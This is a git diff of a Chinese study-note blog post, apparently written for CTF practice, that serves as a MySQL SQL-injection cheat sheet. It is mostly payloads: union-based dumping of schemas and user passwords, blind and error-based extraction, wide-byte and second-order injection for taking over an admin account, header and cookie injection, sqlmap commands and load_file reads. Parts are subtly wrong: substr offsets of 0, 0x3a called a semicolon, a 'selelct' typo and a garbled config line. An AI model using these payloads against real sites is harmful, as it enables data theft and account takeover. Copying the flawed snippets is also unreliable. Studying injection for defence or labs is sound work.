@@ -1,6 +1,6 @@
 ---
 layout:     post
-title:      Web知识笔记之SQL注入（MySQL）
+title:      Web知识笔记（一）SQL注入（MySQL）
 subtitle:   这个系列是重新整理安全的学习笔记，包括Web和PWN的一些基础知识。本章是MySQL数据库的SQL注入。
 date:       2020-11-26
 author:     HouKC
@@ -30,17 +30,36 @@ SQL注入发生位置可以是HTTP数据包中的任意位置。
 ## 0x01 判断有无注入点
 
 ```
-id=1 and 1=1 --  		# 页面响应与正常请求一样
-id=1 and 1=2 --  		# 页面返回异常信息出错
-```
-以上两种情况都存在，基本判断存在SQL注入漏洞。
+# 测试网站反应
+id=1-0	# 看有无报错，没有可能存在数值型注入，需进一步测试
+id=1'	# 看有无报错，还可以尝试用双引号或者反斜杠测试
 
-下面是一些**万能密码**：
+# 第一个正常，第二个异常，存在数值型注入点
+id=1 and 1=1 -- -
+id=1 and 1=2 -- -
+
+# 第一个正常，第二个异常，存在字符型注入点
+id=1' and '1'='1
+id=1' and '1'='2
+```
+还可以用异或注入测试注入点：
+
+```
+# 如果第一个为真，第二个为假，存在数值型注入点
+id=1^1^1
+id=1^1
+
+# 如果第一个为真，第二个为假，存在字符型注入点
+id=1'^'1'^'1
+id=1'^'1
+```
+
+下面是一些**万能密码**，如果下述注入成功，也可以说明存在注入点：
 
 ```
 id=1' or 'a'='a			# 最后面直接与sql语句的分号闭合，就不需要注释符，以此判断为字符型注入
 id=1' or 1=1 #			# 井号注释，可以判断为mysql数据库
-id=1' or 1=1 -- 		# -- 或--+注释，MySQL或Mssql都可以，有时候也不能用
+id=1' or 1=1 -- -		# -- -或--+注释，MySQL或Mssql都可以
 id=1' or 1=1;--			# ;--注释，可以判断为Mssql数据库
 ```
 
@@ -78,11 +97,11 @@ id=ja''ck
 在注入点处插入以下payload测试
 
 ```
-id=1' or 1=1 -- 
-id=-1' union select 1  -- 
-id=-1' union select 1, 2 -- 
-id=-1' union select 1, 2, 3 -- 
-id=-1' order by 3 -- 
+id=1' or 1=1 -- -
+id=-1' union select 1  -- -
+id=-1' union select 1, 2 -- -
+id=-1' union select 1, 2, 3 -- -
+id=-1' order by 3 -- -
 ...... 
 ```
 
@@ -90,18 +109,18 @@ id=-1' order by 3 --
 
 - \' 号前用1或者其他的，也可以置空，视注入语句需要的情况而定，如果是需要前面为真，则需要id等于一个存在的值，如果是要假，则找一个不存在的值即可。
 
-- 最后面的“\-\- ”(注意有空格)是用来注释的，也可以用“\-\-\+”或“\#”。
+- 最后面的“\-\- -”(注意中间有空格)是用来注释的，也可以用“\-\-\+”或“\#”。
 
 上面这些是用来测试使用了多少个字段，知道了字段数之后可以进行的数据库信息查询。
 
 ```
-id=-1' union select 1, database() -- 		# 输出当前数据库名
-id=-1' union select 1, user() -- 			# 输出当前用户名
-id=-1' union select 1, version() -- 		# 输出数据库版本信息
+id=-1' union select 1, database() -- -		# 输出当前数据库名
+id=-1' union select 1, user() -- -			# 输出当前用户名
+id=-1' union select 1, version() -- -		# 输出数据库版本信息
 ```
 如果需要输出的字段比原来输出的少，可以用下面这句进行拼接输出，利用concat或group_concat函数进行拼接。
 ```
-id=-1' union select username, concat("passwd, user_id, age") -- 
+id=-1' union select username, concat("passwd, user_id, age") -- -
 ```
 
 
@@ -111,13 +130,26 @@ id=-1' union select username, concat("passwd, user_id, age") --
 在MySQL 5.0以上就有information_schema库，记录所有数据库名、表名和列名信息，因此可以利用该内置库查询信息，乃至脱库。
 
 ```
-id=-1' union select schema_name from information_schema.schemata --     # 查看数据库名
-id=-1' union select table_schema, table_name from information_schema.tables --   # 查看表名
-id=-1' union select table_schema, column_name from information_schema.columns where schema_name='[库名]' and table_name='[表名]' --  # 查找列名
-id=-1' union select group_concat(table_name) from information_schema.tables where table_schema = '[库名]' --    # 列举某个数据库下的所有表名
-id=-1' union select group_concat(column_name) from information_schema.columns where table_name = '[表名]' --   # 列举某个表下的所有列名
-id=-1' union select [列名] from [表名] --     # 直接就用select查询数据
+# 查看数据库名
+id=-1' union select schema_name from information_schema.schemata -- -
+
+# 查看表名
+id=-1' union select table_schema, table_name from information_schema.tables -- -
+
+# 查找列名
+id=-1' union select table_schema, column_name from information_schema.columns where schema_name='[库名]' and table_name='[表名]' -- -
+
+# 列举某个数据库下的所有表名
+id=-1' union select group_concat(table_name) from information_schema.tables where table_schema = '[库名]' -- -
+
+# 列举某个表下的所有列名
+id=-1' union select group_concat(column_name) from information_schema.columns where table_name = '[表名]' -- -
+
+# 直接就用select查询数据
+id=-1' union select [列名] from [表名] -- -
 ```
+
+注：MySQL版本小于5.0则需要字典爆破库名、表名和列名。
 
 
 
@@ -128,9 +160,9 @@ id=-1' union select [列名] from [表名] --     # 直接就用select查询数�
 1. 基于时间的盲注
 
 ```
-id=1' and if(ascii(substr(database(),1,1))<N, sleep(3), 1) -- 
-id=1' and if(ascii(substr(database(),1,1))>N, sleep(3), 1) -- 
-id=1' and if(ascii(substr(database(),1,1))=N, sleep(3), 1) -- 
+id=1' and if(ascii(substr(database(),0,1))<N, sleep(3), 1) -- -
+id=1' and if(ascii(substr(database(),0,1))>N, sleep(3), 1) -- -
+id=1' and if(ascii(substr(database(),0,1))=N, sleep(3), 1) -- -
 ```
 
 当数据库名第一个字母的ascii码小于、大于或等于N时，执行一次sleep(3)函数等待3秒，依据响应的时间，可以判断执行成功或失败，进而逐步找出字符并拼接形成数据库名。
@@ -140,8 +172,11 @@ id=1' and if(ascii(substr(database(),1,1))=N, sleep(3), 1) --
 另外还有其他时间盲注方法：
 
 ```
-id=1' and (select if(length(database())>N, sleep(5), null) -- 				# 当前数据库名长度大于N时，延时5秒
-id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1		# 当前数据库名长度大于N时，不延时，反之延时5秒
+# 当前数据库名长度大于N时，延时5秒
+id=1' and (select if(length(database())>N, sleep(5), null) -- -
+
+# 当前数据库名长度大于N时，不延时，反之延时5秒
+id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1 
 ```
 
 
@@ -149,19 +184,19 @@ id=-1' or (length(database()))>N or if(1=1, sleep(5), null) or '1'='1		# 当前�
 2. 基于布尔的盲注
 
 ```
-id=1' and length(database()) -- 
-id=1' and substr(database(), 1, 1) -- 
-id=1' and ascii(substr(database(), 0, 1)) -- 
-id=1' and ascii(substr(database(), 0, 1))>N -- 
-id=1' and ascii(substr(database(), 0, 1))=N -- 
-id=1' and ascii(substr(database(), 0, 1))<N -- 
+id=1' and length(database()) -- -
+id=1' and substr(database(), 1, 1) -- -
+id=1' and ascii(substr(database(), 0, 1)) -- -
+id=1' and ascii(substr(database(), 0, 1))>N -- -
+id=1' and ascii(substr(database(), 0, 1))=N -- -
+id=1' and ascii(substr(database(), 0, 1))<N -- -
 ```
 
 原理同时间盲注，就看正常输出还是页面异常。
 
 
 
-## 0x06 **报错注入**
+## 0x06 报错注入
 
 #### 1. floor报错注入
 
@@ -178,17 +213,17 @@ id=1' and ascii(substr(database(), 0, 1))<N --
 
 获取数据库
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- 
+0' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 获取表名
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- 
+0' union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 获取用户信息
 ```
-0' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- 
+0' union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1), floor(rand(0)*2))x from information_schema.tables group by x)a -- -
 ```
 
 #### 2. updatexml报错注入
@@ -202,30 +237,220 @@ updatexml(xml_document, xpath_string, new_value)
 - 第三个参数：替换查找到的符合条件的数据
 
 ```
-id=1' and updatexml(1, concat(0x7e, version(), 0x7e),1) -- 
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1)  -- 	# 查找第一个数据库
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 1,1),0x7e),1)  --		# 查找第二个数据库，以此类推
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),1)  --		# 依次查找表名
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1),0x7e),1)  --		# 依次查找列名
+# 查看版本信息
+id=1' and updatexml(1, concat(0x7e, version(), 0x7e),1) -- -
+
+# 查找第一个数据库
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 0,1),0x7e),1)  -- -
+
+# 查找第二个数据库，以此类推
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select schema_name),0x7e) FROM information_schema.schemata limit 1,1),0x7e),1)  -- -
+
+# 依次查找表名
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select table_name),0x7e) FROM information_schema.tables where table_schema='[库名]' limit 0,1),0x7e),1)  -- -
+
+# 依次查找列名
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select column_name),0x7e) FROM information_schema.columns where table_name='[表名]' limit 0,1),0x7e),1)  -- -
 
 # 一次查出所有表名
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) FROM information_schema.tables where table_schema='[库名]'),0x7e),1)  -- 
-# 一次查找某个表下所有列名
-id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) FROM information_schema.columns where table_name='[表名]'),0x7e),1) -- 
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) FROM information_schema.tables where table_schema='[库名]'),0x7e),1)  -- -
 
+# 一次查找某个表下所有列名
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) FROM information_schema.columns where table_name='[表名]'),0x7e),1) -- -
+
+# 依次爆破数据
+id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat([列名1],0x3a,[列名2])),0x7e) FROM [库名].[表名]),0x7e),1)  -- -
 ```
 
 其中：
 
 - distinct表示返回后面的内容不重复。
+
 - 0x7e为波浪线，用于分隔。
+
+- 0x3a为分号，用于分隔。
+
+- group_concat()会把结果按照输入的字段进行分组拼接，每组拼成一个字符串，组与组之间用逗号隔开，再拼接成一个完整的字符串。
 
 update注入就常用updatexml函数来注入：
 
 ```
-id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- 
+id=-1' or updatexml(1, concat(0x7e, version(), 0x7e), 1) -- -
 ```
 
+
+
+## 0x07 宽字节注入
+
+GBK占用两字节，ASCII占用一字节，PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。
+
+%DF\'：被PHP当中的addslashes函数转义为 %DF\\\'，\\ 即URL里的 %5C，也就是说，%DF\\\' 会被转成 %DF%5C%27 。倘若网站的字符集是GBK编码的，MySQL使用的编码也是GBK的话，就会被认为 %DF%5 是一个宽字符。编码之后是“運”。
+
+```
+id=1%df%27 union select 1,2,3 -- -
+```
+
+或者sqlmap对宽字节注入，直接注入需要将%df放在链接中：
+
+```
+sqlmap -u "http://xxx.com/xxx.php?id=1%df%27" --dbs
+```
+
+也可以使用sqlmap tamper脚本，其中unmagicquotes.py是专门用于宽字节注入的脚本：
+
+```
+sqlmap -u "http://xxx.com/xxx.php?id=1" --tamper=unmagicquotes.py --dbs
+```
+
+最常使用的宽字节注入是利用%df，其实只要第一个ascii码大于128就可以了，比如ascii码为129的就可以，但是我们怎么将它转换为URL编码呢，其实很简单，我们先将129（十进制）转换为十六进制，为0x81，然后再十六进制前面加%即可，即为%81。GBK首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）。如下面这个例子用的是%bf
+
+```
+id=1%bf' union selelct 1,2,3 -- -
+```
+
+
+
+## 0x08 二次注入
+
+二次注入是指，输入一个带有SQL注入语句的字符串，提交后，在另一处输入时二次修改（如注册账户时注入，修改账号密码时二次注入），这种注入需要一定技巧。
+
+举个例子吧，我们不知道网站的admin用户的密码，现在要利用二次注入修改其密码达到攻击的目的。
+
+- 首先我们注册一个用户名为“admin\' -- -”的用户，密码随意。
+
+- 再在登录页登录这个“admin\' -- -”用户。
+- 跳转到修改密码的页面，输入“admin\' -- -”，这里是利用update语句对admin账户进行攻击：
+
+```sql
+update users set password='$pass' where username='$username';
+# 修改为
+update users set password='123456' where username='admin' -- -';
+```
+
+- 这样admin后面的内容相当于注释，是不执行的，这样就修改了admin的密码，我们就可以用自己设置的密码登上admin账户了。
+
+
+
+## 0x09 异或注入
+
+异或注入类似布尔盲注，利用异或运算后的结果是真或假来判断注入语句执行情况。
+
+A语句^B语句：
+
+- 如果A、B都为真或者都为假，那么结果为假；
+- 如果A、B一真一假，那么结果为真。
+
+可以利用这一点测试后端过滤了哪些关键词：
+
+```
+# 如果结果为真，说明存在select等关键词过滤
+id=1'^(length('select')!=0) -- -
+id=1'^(length('union')!=0) -- -
+id=1'^(length('or')!=0) -- -
+id=1'^(length('and')!=0) -- -
+```
+
+也可以判断注入点
+
+```
+# 如果第一个为真，第二个为假，存在数值型注入点
+id=1^1^1
+id=1^1
+
+# 如果第一个为真，第二个为假，存在字符型注入点
+id=1'^'1'^'1
+id=1'^'1
+```
+
+
+
+## 0x09 HTTP头注入
+
+####  1. 注入类型
+
+前面所说都是基于GET方式的注入，除此之外还有基于POST方式的注入，HTTP头还有很多可能存在注入的地方。如：
+
+- POST方式注入
+- referer的注入
+- user-agent注入
+- x-forwarded-for注入
+- client-ip注入
+- cookie注入
+
+#### 2. user-agent注入、client-ip注入、x-forwarded-for注入
+
+注入流程跟GET方式注入是一样的，只不过换了一个输入的位置。HTTP头的注入位置有时候不太好猜，可以利用sqlmap进行自动化注入，但需要注意，sqlmap需要level为2时才会进行cookie注入，level为3时才会进行HTTP头其他类型的注入。
+
+- 利用Burpsuite设置代理，抓取HTTP请求内容，保存为target.txt文件中。
+- 如果测试referer注入，则修改target.txt文件，在referer的值后面，加上\*号并保存，然后使用sqlmap自动攻击：
+
+```
+sqlmap -r target.txt --current-db --level 3
+```
+
+user-agent、client-ip、x-forwarded-for的注入同理。
+
+#### 3. cookie注入
+
+cookie注入一般是因为后台使用$\_REQUEST[\'xxx\']，而不是$\_GET[\'xx\']或者$\_POST[\'xxx\']。
+
+- 利用sqlmap进行注入
+
+```http
+cookie:{uname=admin*; test=test}
+```
+
+cookie注入也是，在admin后加\*号表示注入点。
+
+```
+sqlmap -r target.txt --level 2
+# 或者
+sqlmap -u "http://xxx.com/xxx.php" --cookie "id=1" --level 2
+```
+
+- 手工注入
+
+可以利用Burpsuite抓包改cookie，可以利用Chrome浏览器地址栏执行js代码修改cookie，首先要访问正常的存在注入点的页面，等页面完全打开之后，清空地址栏，输入
+
+```javascript
+javascript:alert(document.cookie="id="+escape("1 and 1=1"))
+```
+
+这个时候再去访问页面就会携带上面设置的cookie，我们再次访问页面看是否正常。这里escape()的参数就是注入的部分，往里面写
+
+```javascript
+javascript:alert(document.cookie="id="+escape("1 and 1=2 select 1,2,3,4,5,6,7,8 from admin"))
+......
+```
+
+#### 4. post注入
+
+```
+sqlmap -u "http://xxx.com/xxx.php" --data "id=1"
+或者
+sqlmap -u "http://xxx.com/xxx.php" --form
+```
+
+常见post注入情况：
+
+- 注册用户
+- 登录账号
+- 留言
+- 修改账号
+- 修改个人资料
+- 上传文件
+- 搜索框
+
+
+
+## 0x0a load_file文件读取
+直接load_file导入文件内容
+
+```
+id=-1' union select 1, load_file('E:\flag.txt'),3 --+  
+```
+
+本地调试的时候可以在my.ini中添加这句话[mysqld]port=3306basedir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/datadir=D:/php/phpStudy_64/phpstudy_pro/Extensions/MySQL5.7.26/data/character-set-server=utf8default-storage-engine=MyIsam#支持INNODB引擎模式。修改为default-storage-engine=INNODB即可。#如果INNODB模式如果不能启动，删除data目录下ib开头的日志文件重新启动。secure_file_priv=         #就是这一句！！！！！max_connections=100collation-server=utf8_unicode_ciinit_connect='SET NAMES utf8'innodb_buffer_pool_size=64Minnodb_flush_log_at_trx_commit=1然后保存重启mysql，进入mysql命令行之后，可以输入以下命令查询show global variables 
 
 
 
